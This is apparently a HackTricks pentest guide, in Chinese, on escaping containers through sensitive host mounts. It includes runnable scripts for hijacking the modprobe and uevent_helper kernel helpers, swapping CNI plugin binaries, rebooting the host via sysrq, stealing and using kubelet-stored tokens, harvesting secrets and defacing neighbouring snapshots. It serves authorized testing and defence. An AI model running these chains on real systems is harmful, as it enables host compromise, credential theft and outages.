# 敏感主机挂载

{{#include ../../../banners/hacktricks-training.md}}

## 概述

主机挂载是最重要的实用容器逃逸攻击面之一，因为它们往往会打破精心隔离的进程视图，使其重新直接暴露主机资源。危险情况不只限于 `/`。对 `/proc`、`/sys`、`/var`、运行时 socket、由 kubelet 管理的状态目录或设备相关路径进行 bind mount，可能暴露内核控制接口、凭据、相邻容器的文件系统以及运行时管理接口。

本页与各项单独的防护页面分开，因为其滥用模型涉及多个方面：部分与 mount namespace 有关，部分与 user namespace 有关，部分取决于 AppArmor 或 SELinux 的覆盖范围，还有部分取决于暴露的具体主机路径。将其作为单独主题讨论，更便于分析攻击面。

还要比较主机上可写目录与每个容器内对应路径。如果该目录被挂载到一个存放可执行启动脚本的目录上，权限较低的主机用户可能可以植入代码，供权限较高的容器 entrypoint 在下次重启时加载。确认准确的 bind mount 源路径和目标路径、目录的写入/搜索权限、entrypoint 循环和可执行文件要求、运行时 UID，以及实际的重启触发条件。容器内的 UID 0 不会自动等同于主机 UID 0；user namespace 映射和挂载策略决定了对主机的影响。被动审查应报告路径和权限，不要写入脚本或重启工作负载。

Linux 容器可能运行在管理 VM 中，而该 VM 与单独的 Windows 主机共享部分文件系统。[VirtualBox shared folders](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) 是让主机文件在 guest 中可见的一种方式，但该 VM 中的 root 仍是与 Windows 管理员不同的身份。如果共享目录暴露了某个用户可读的 SSH 私钥，应将其视为凭据线索：在认定该密钥可用于登录主机之前，先核实由主机提供的确切挂载、密钥所有权和访问权限、对应的账户，以及 Windows SSH server 的**有效**授权密钥策略。现代 [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) 通常会为管理员账户使用单独的 `administrators_authorized_keys` 文件。常规枚举输出中不要包含私钥内容；被动初步排查只需记录挂载和密钥路径的元数据。

## `/proc` 暴露

procfs 包含普通进程信息，也包含影响重大的内核控制接口。因此，诸如 `-v /proc:/host/proc` 这样的 bind mount，或暴露了意外可写 proc 条目的容器视图，都可能导致信息泄露、拒绝服务或直接在主机上执行代码。

procfs 中价值较高的路径包括：

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/`（尤其是 `register` 和 `status`）
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### 滥用

首先检查哪些高价值 procfs 条目可见或可写：

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

这些路径因不同原因而值得关注。可写入时，`core_pattern`、`modprobe` 和 `binfmt_misc` 都可能成为主机代码执行路径。`kallsyms`、`kmsg`、`kcore` 和 `config.gz` 是进行 kernel exploitation 时非常有用的侦察信息来源。`sched_debug` 和 `mountinfo` 会暴露进程、cgroup 和文件系统上下文，有助于从容器内部还原主机布局。

每个路径的实际价值各不相同；如果把它们都视为影响相同，反而会让分诊更困难：

- `/proc/sys/kernel/core_pattern`
  如果可写，这是影响最大的 procfs 路径之一，因为 kernel 会在发生崩溃后执行管道处理程序。能够将 `core_pattern` 指向存储在 overlay 或已挂载主机路径中的 payload 的容器，通常可以获得主机代码执行。另请参阅 [read-only-paths.md](protections/read-only-paths.md)，其中有专门的示例。
- `/proc/sys/kernel/modprobe`
  此路径控制 kernel 在需要调用模块加载逻辑时使用的 userspace helper。如果容器内可写，且该路径在主机上下文中被解析，它也可能成为主机代码执行原语。若还能触发该 helper 路径，就尤其值得关注。
- `/proc/sys/vm/panic_on_oom`
  这通常不是一种直接的逃逸原语，但它可以将内存压力转化为影响整个主机的拒绝服务：使 OOM 条件触发 kernel panic。
- `/proc/sys/fs/binfmt_misc`
  如果注册接口可写，攻击者可能为指定的 magic value 注册处理程序，并在执行匹配文件时获得主机上下文中的执行权限。
- `/proc/config.gz`
  对 kernel exploit 分诊很有用。无需主机软件包元数据，即可借此判断启用了哪些子系统、缓解措施和可选 kernel 功能。
- `/proc/sysrq-trigger`
  主要是拒绝服务路径，但后果非常严重。它可以立即重启、触发 panic，或以其他方式中断主机运行。
- `/proc/kmsg`
  会暴露 kernel ring buffer 消息。可用于主机指纹识别、崩溃分析，在某些环境中还可能 leak 有助于 kernel exploitation 的信息。
- `/proc/kallsyms`
  如果可读，就很有价值，因为它会暴露导出的 kernel 符号信息，并可能帮助在开发 kernel exploit 时绕过地址随机化假设。
- `/proc/[pid]/mem`
  这是一个直接访问进程内存的接口。如果满足必要的 ptrace 类条件且目标进程可访问，它可能允许读取或修改其他进程的内存。实际影响很大程度上取决于凭据、`hidepid`、Yama 和 ptrace 限制，因此这是一个强大但有条件的路径。
- `/proc/kcore`
  暴露类似 core image 的系统内存视图。该文件体积巨大且使用不便，但如果它确实可读，就表明主机内存暴露面存在严重问题。
- `/dev/kmem` 和 `/dev/mem`
  这些是历史上影响很大的原始内存**设备**接口，不是 procfs 文件。在许多现代系统上，它们不存在或受到严格限制，但如果容器能够打开主机挂载的副本，就应将此暴露视为严重问题。检查它们时，应与其他敏感的 `/dev` 挂载一并审查，而不是去搜索并不存在的 `/proc/kmem` 或 `/proc/mem` 路径。
- `/proc/sched_debug`
  会 leak 调度和任务信息，即使其他进程视图看起来比预期更干净，也可能暴露主机进程身份。
- `/proc/[pid]/mountinfo`
  对于还原容器在主机上的实际位置、判断哪些路径由 overlay 提供，以及确认可写挂载对应的是主机内容还是仅容器层，都极为有用。

如果 `/proc/[pid]/mountinfo` 或 overlay 细节可读，可利用它们还原容器文件系统在主机上的路径：

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

这些命令很有用，因为许多 host-execution 技巧都需要将容器内的路径转换为从 host 视角对应的路径。

### 示例：准备 `modprobe` Helper 路径

如果容器内可写入 `/proc/sys/kernel/modprobe`，且 helper 路径是在 host 上下文中解析的，就可以将其重定向到攻击者控制的 payload。overlay upper directory 必须能从 host 上解析；如果容器没有同时挂载 host 的 `/tmp`，则证明输出也必须写回同一 host 可见的容器层：

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

具体触发方式取决于目标和内核行为，因此这里有意不作猜测。离开实验环境前，请恢复原始值。关键在于，可写的 helper 路径能够将未来的内核 helper 调用重定向到攻击者控制的 host 路径内容。缺少 overlay `upperdir`、主机无法解析该路径、sysctl 挂载为只读，或内核从未调用所选 helper，都会中断这条攻击链。

### 完整示例：使用 `kallsyms`、`kmsg` 和 `config.gz` 进行内核侦察

如果目标是评估可利用性，而不是立即逃逸：

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

这些命令有助于判断是否能看到有用的符号信息、近期内核消息是否揭示了有趣的状态，以及编译时启用了哪些内核功能或缓解措施。其影响通常不是直接逃逸，但可以显著缩短内核漏洞排查所需的时间。

### 完整示例：SysRq 主机重启

如果 `/proc/sysrq-trigger` 可写，且能访问主机视图：

```bash
echo b > /proc/sysrq-trigger
```

其效果是立即重启主机。这不是一个隐蔽的示例，但它清楚地说明，procfs 暴露可能比信息泄露严重得多。

## `/sys` 暴露

sysfs 会暴露大量内核和设备状态。某些 sysfs 路径主要用于指纹识别，其他路径则可能影响 helper 执行、设备行为、安全模块配置或固件状态。

高价值的 sysfs 路径包括：

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

这些路径的重要性各不相同。在暴露配置不当的环境中，`/sys/class/thermal` 可能影响热管理行为，进而影响主机稳定性。`/sys/kernel/vmcoreinfo` 可能 leak 崩溃转储和内核布局信息，有助于进行底层主机指纹识别。`/sys/kernel/security` 是 Linux Security Modules 使用的 `securityfs` 接口，因此意外访问可能暴露或更改与 MAC 相关的状态。EFI 变量路径可能影响由固件支持的启动设置，因此其风险远高于普通配置文件。`/sys/kernel/debug` 下的 `debugfs` 尤其危险，因为它本来就是面向开发者的接口，其安全预期远低于面向生产环境的强化内核 API。

此列表中的每个 sysfs 条目都**取决于内核、配置和硬件**。当前的虚拟化节点通常完全不包含 `uevent_helper`、EFI 变量和热设备条目。遇到不存在的路径时，应将其记录为前置条件不满足，而不是假设其他内核中的示例同样适用。

这些路径的实用审查命令如下：

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

这些命令为何值得关注：

- `/sys/kernel/security` 可能会暴露 AppArmor、SELinux 或其他 LSM 接口，让本应仅限主机访问的内容变得可见。
- `/sys/kernel/debug` 通常是这一组中最令人担忧的发现。如果 `debugfs` 已挂载且可读或可写，就应预期存在范围广泛的内核接口，其具体风险取决于启用的调试节点。
- EFI 变量暴露较少见，但影响很大，因为它涉及由固件支持的设置，而非普通的运行时文件。
- `/sys/class/thermal` 主要与主机稳定性和硬件交互有关，而不是典型的 shell 风格逃逸。
- `/sys/kernel/vmcoreinfo` 主要用于主机指纹识别和崩溃分析，可帮助了解底层内核状态。

### 完整示例：`uevent_helper`

`/sys/kernel/uevent_helper` 取决于内核和配置，在许多较新的系统上并不存在。如果它存在且可写，并且有可用的 `uevent` 触发方式，内核可能会执行攻击者控制的 helper。验证输出必须使用从主机和容器视角都可见的路径：

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

这样做之所以有效，是因为 helper 路径是从 host 的视角解析的。触发后，helper 会在 host 上下文中运行，而不是在当前 container 内运行。`/sys/class/mem/null/uevent` 是在公开该路径的内核上的一个具体触发点；其他设备可能也会公开自己的 `uevent` 文件，但不要在真实硬件上盲目选择。离开实验环境前，请恢复原始值。如果 helper 文件或受控触发点不存在，就不要声称此 technique 可用。

## `/var` 暴露

将 host 的 `/var` 挂载到 container 中，往往会被低估，因为它看起来不如挂载 `/` 那么惊人。实际上，这样做可能足以访问运行时 socket、container 快照目录、由 kubelet 管理的 pod 卷、投射的 service-account token，以及相邻应用的文件系统。在现代节点上，`/var` 往往是 container 状态中实际最具操作价值的所在。

### Kubernetes 示例

带有 `hostPath: /var` 的 pod 通常可以读取其他 pod 投射的 token 和 overlay 快照内容：

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

这些命令很有用，因为它们能判断挂载内容是普通的应用数据，还是高影响力的集群凭据。可读取的 service-account token 可能会立即将本地代码执行转变为 Kubernetes API 访问权限。

如果存在该令牌，应验证它能够访问哪些资源，而不是止步于发现令牌：

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

这里的影响可能远不止本地节点访问。具有广泛 RBAC 权限的 token 可以将挂载的 `/var` 变成对整个集群的 compromise。

### Docker 和 containerd 示例

在 Docker 主机上，相关数据通常位于 `/var/lib/docker` 下；而在基于 containerd 的 Kubernetes 节点上，相关数据可能位于 `/var/lib/containerd` 或特定 snapshotter 的路径下：

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

如果挂载的 `/var` 暴露了另一个工作负载的可写快照内容，攻击者可能无需触碰当前容器配置，就能修改应用文件、植入网页内容或更改启动脚本。

在**一次性实验室工作负载**上，可写快照内容可用于演示应用篡改、机密恢复或横向移动。请先将运行时容器 ID 映射到确切的快照，切勿编辑无关快照或生产快照：

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

这些命令很有用，因为它们展示了挂载 `/var` 的三种主要影响：篡改应用、恢复 secret，以及横向移动到相邻工作负载。

直接写入快照会绕过 runtime 的常规状态管理，可能损坏容器或破坏证据。我们在本地通过 Docker `overlay2` 重现了只读发现：在相邻的临时容器中写入的标记出现在 `/var/lib/docker/overlay2/<id>/diff/` 下。实际快照修改仅限于为此测试创建的临时容器。

## Kubelet 状态、插件和 CNI 路径

挂载 `/var/lib/kubelet`、`/opt/cni/bin` 或 `/etc/cni/net.d`，通常是通过特权 DaemonSet、CNI agent、CSI 节点插件、GPU operator 和存储辅助程序暴露出来的。这些挂载很容易被当作“节点管线设施”而忽略，但它们直接位于新 pod 的执行路径中，而且通常包含 kubelet 凭据、投射的 secret、注册 socket，以及主机侧可执行插件二进制文件。

高价值目标包括：

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

有用的审查命令包括：

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

这些路径为何重要：

- `/var/lib/kubelet/pki` 可能暴露 kubelet 客户端证书和其他节点本地凭据。根据集群设计，这些凭据有时可重复用于访问 API server 或面向 kubelet 的 TLS 端点。<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` 通常包含投射的 service-account tokens，以及同一节点上相邻 pod 挂载的 Secrets。
- `/var/lib/kubelet/pod-resources/kubelet.sock` 主要是一个 reconnaissance 面，但非常有用：它能揭示当前哪些 pod 和容器占用了 GPU、大页、SR-IOV 设备以及其他稀缺的节点本地资源。<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`、`/var/lib/kubelet/plugins` 和 `/var/lib/kubelet/plugins_registry` 能揭示安装了哪些 CSI、DRA 和设备 plugins，以及 kubelet 预期会与哪些 sockets 通信。如果这些目录可写而不只是可读，问题就严重得多。<sup>[[1]](#references)</sup>
- `/opt/cni/bin` 和 `/etc/cni/net.d` 直接位于 pod 网络配置路径上。对这些路径的可写访问通常意味着一种延迟触发的 host 执行手段，而不只是配置泄露。<sup>[[2]](#references)</sup>

### 完整示例：可写的 `/opt/cni/bin`

如果某个主机 CNI binary 目录以读写方式挂载，只要替换一个 plugin，就可能在 kubelet 下次于该节点创建 pod sandbox 时获得 host 执行能力：<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

这不像挂载 `docker.sock` 那样直接，但在遭到入侵的 Kubernetes 基础设施 Pod 中，这种情况往往更贴近现实。标记会写入已挂载插件旁边，因此即使容器没有挂载 host-root 或 host-`/tmp`，也能读取该标记。wrapper 会保留原始参数和标准输入，随后示例会还原原始二进制文件。关键在于，修改后的二进制文件之后会由主机网络设置流程执行，而不是由当前容器执行。请仅在一次性节点上使用，因为无效的 wrapper 可能导致新 Pod 沙箱无法获得网络连接。

## Runtime Sockets

敏感的主机挂载通常包含运行时套接字，而不是完整目录。这些套接字非常重要，值得在此特别重申：

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

一旦挂载了这些 socket 之一，请参阅 [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) 了解完整的利用流程。

一种快速的初始交互模式：

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

如果其中一种方式成功，从“mounted socket”到“启动权限更高的 sibling container”的路径，通常比任何 kernel breakout 路径都短得多。

相同的 daemon 访问权限也可以用于建立 **host persistence**。具有可写 host-root bind mount 的 helper container 可以通过 `docker cp` 接收文件，然后使用 `docker exec` 将 SSH key、service unit 或其他 persistence 文件放到挂载的 host 路径下。安全边界在于 daemon 创建 host mount 的权限；`docker cp` 只是一个暂存步骤。在 runtime socket 暴露后，应审计新创建的 containers，以及对 host authentication 或 startup 路径的写入。

## 可写 Host 路径任务劫持

可写 host mount 不必暴露 `/` 才会造成危险。如果挂载路径包含脚本、配置文件、hooks、plugins，或之后会被 host 侧 scheduled task 或 service 使用的文件，container 就可能更改 host 执行的内容。

通用审查流程：

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

如果某个可写文件会被主机进程使用，在测试时应保持 payload 简单且便于观察：

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

有意思的地方在于信任边界：写入操作发生在容器内部，但执行操作稍后会在 host 服务上下文中发生。这会将范围有限的 hostPath 或 bind mount 变成一种延迟触发的 host 代码执行原语。

## 共享 Host 路径上的 Root 所有文件

能够成为 root 的容器账户，可能可以在 host 也使用的可写路径上放置一个由 root 所有的文件。如果容器 UID 0 映射到 host UID 0，两个视图指向同一个文件，并且 host mount 允许 SUID 执行，那么能够运行该路径上由 root 所有的 SUID 可执行文件的 host 用户，可能跨越 host 权限边界。就这个文件所有权问题而言，容器不必以 `--privileged` 运行。关于其他独立条件，请参阅 [user namespace mappings](protections/namespaces/user-namespace.md) 和 [SUID 讨论](privileged-containers.md)。

**从两侧**检查该路径：对比一个无害文件的所有权和身份，检查容器的 `uid_map` 和 `gid_map`，并检查 host 的 mount 选项和执行策略。容器侧的 `rw` 且没有 `nosuid`，只能说明它值得进一步检查；仅凭这些无法确认 host 所有权、host mount 标志、host 用户的访问权限，或 AppArmor/SELinux 是否会阻止执行。`noexec` 会限制其生效视图中的执行。`/proc/self/mountinfo` 中的 `shared:` 和 `master:` 标签描述的是 mount 传播行为，而非文件内容是否与 host 共享。bind mount 可能没有这些标签。提供 host 登录的凭据复用，是与共享文件权限边界不同的步骤。

即使没有显式 bind mount，host 的 runtime 存储也可能形成类似路径。[CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) 允许非特权 host 用户遍历 Docker 数据子目录，并从容器文件系统执行文件；Moby 在 20.10.9 中修复了权限问题，并指出必须重启正在运行的容器才能修正其目录。检查确切的 `overlay2/<id>/merged` 挂载路径及每个父目录的搜索权限，然后确认容器 UID 0 是否映射到 host UID 0、是否存在且可访问真正由 root 所有的 SetUID 可执行文件，以及 host 视图是否允许 SetUID 执行。Rootless 或 user-namespace-remapped 容器、`nosuid`、`noexec`、`no_new_privs` 和 MAC 策略都可能改变结果。runtime 版本或可遍历路径本身只是进一步检查的线索，并不能证明可以在 host 上以 root 身份执行；检查 mount 和文件元数据时，不要运行可疑的可执行文件。

## 与 Mount 相关的 CVE

Host mount 也会受到 runtime 漏洞的影响。近期重要示例包括：

- `runc` 中的 `CVE-2024-21626`：泄露的目录文件描述符可能将工作目录置于 host 文件系统上。
- BuildKit 中的 `CVE-2024-23651`、`CVE-2024-23652` 和 `CVE-2024-23653`：恶意 Dockerfile、frontends 和 `RUN --mount` 流程可能在构建期间重新引入 host 文件访问、删除文件或提升权限的能力。
- Buildah 和 Podman 构建流程中的 `CVE-2024-1753`：构建期间精心构造的 bind mount 可能以读写方式暴露 `/`。
- `containerd` 2.1.0 中的 `CVE-2025-47290`：镜像解包期间的 TOCTOU 可能导致精心构造的镜像在拉取时修改 host 文件系统。

这些 CVE 在此处值得关注，因为它们表明，mount 处理并不只是操作人员的配置问题。runtime 本身也可能引入由 mount 驱动的逃逸条件。

## 检查

使用以下命令快速定位风险最高的 mount 暴露：

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

这里有哪些值得关注的地方：

- Host root、`/proc`、`/sys`、`/var` 和 runtime sockets 都是高优先级发现。
- 可写的 proc/sys 条目通常意味着挂载暴露的是主机全局内核控制项，而非安全的容器视图。
- 挂载的 `/var` 路径需要检查凭据和相邻工作负载，而不能只检查文件系统。
- Kubelet 状态目录和 CNI/plugin 路径应与 runtime sockets 同等看待，因为它们通常直接位于节点的 pod 创建和凭据分发路径上。

## 本地验证状态

本页中的实用攻击链已在本地 Linux minikube 节点上进行检查。验证复现了以下情况：

- 通过临时可写的 hostPath 进行读写访问
- 通过 `/var/lib/kubelet/pods` 发现投射的 ServiceAccount tokens 和挂载的 Secrets
- 使用从挂载的 kubelet 状态中恢复的有效 token 成功进行 Kubernetes API 身份验证
- 通过挂载的 `/var` 以只读方式发现相邻 Docker `overlay2` 文件系统
- 通过挂载的 `docker.sock` 使用 Docker API 创建带只读主机绑定的同级容器
- 通过临时的主机消费 hook 延迟执行主机上的命令
- 模拟 CNI-wrapper，同时保留原始 plugin 的参数、标准输入和执行过程

同一节点暴露了 `core_pattern`、`modprobe`、`binfmt_misc/register`、`kallsyms`、`kcore` 和 `config.gz`，但没有暴露 `uevent_helper`、EFI variables、thermal 条目或 `sched_debug`。未执行具有破坏性的内核触发操作。这证实了 host-root、`/var`、kubelet-state、socket 和 host-consumer 攻击链可被复现；而 procfs/sysfs helper 技术则必须根据具体的内核、挂载模式、payload 路径和触发条件进行判断。

## References

- [1] [Kubelet 使用的本地文件和路径](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent 容器可通过 `hostPath` 挂载访问主机](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
